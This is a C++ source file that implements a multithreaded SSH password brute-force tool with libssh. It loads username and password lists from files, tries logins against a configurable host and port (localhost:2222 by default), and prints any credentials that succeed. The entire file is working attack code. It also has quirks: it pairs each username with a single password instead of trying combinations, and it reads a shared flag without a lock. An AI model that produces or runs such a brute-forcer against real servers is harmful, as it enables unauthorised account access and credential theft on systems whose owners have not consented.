#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <mutex>
#include <libssh/libssh.h>

std::mutex print_mutex;  // Prevents console output overlap
std::mutex data_mutex;   // Synchronizes access to usernames/passwords
std::vector<std::string> usernames;  // Stores usernames
std::vector<std::string> passwords;  // Stores passwords
std::string hostname = "localhost";  // Target SSH server
int port = 2222; // Set custom SSH port here
bool found = false;  // Flag to stop brute-force if login is successful

// Function to attempt SSH login
void attempt_ssh_login(int thread_id) {
    while (true) {
        std::string username, password;

        // Lock and get a username-password combination
        {
            std::lock_guard<std::mutex> lock(data_mutex);
            if (usernames.empty() || passwords.empty() || found) return;  // Exit if exhausted or found

            username = usernames.back();
            usernames.pop_back();

            password = passwords.back();
            passwords.pop_back();
        }

        // Create SSH session
        ssh_session session = ssh_new();
        if (!session) return;
        ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
        ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);


        // Attempt connection
        if (ssh_connect(session) != SSH_OK) {
            ssh_free(session);
            return;
        }

        // Attempt authentication
        int auth_result = ssh_userauth_password(session, username.c_str(), password.c_str());
        if (auth_result == SSH_AUTH_SUCCESS) {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "[+] SUCCESS: " << username << "@" << hostname << " -> " << password << "\n";
            found = true;
        } else {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "[-] Failed: " << username << ":" << password << "\n";
        }

        ssh_disconnect(session);
        ssh_free(session);
    }
}

// Function to load usernames and passwords from files
void load_data(const std::string &user_file, const std::string &pass_file) {
    std::ifstream ufile(user_file), pfile(pass_file);
    
    if (!ufile || !pfile) {
        std::cerr << "Error: Could not open username or password file.\n";
        exit(1);
    }

    std::string line;
    while (std::getline(ufile, line)) {
        usernames.push_back(line);
    }
    while (std::getline(pfile, line)) {
        passwords.push_back(line);
    }

    ufile.close();
    pfile.close();
}

int main() {
    std::string userlist = "usernames.txt";
    std::string passlist = "passwords.txt";
    load_data(userlist, passlist);

    int num_threads = 5;  // Adjust based on system capability
    std::vector<std::thread> threads;

    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back([i]() { attempt_ssh_login(i); });
    }

    for (auto &t : threads) {
        t.join();
    }

    return 0;
}
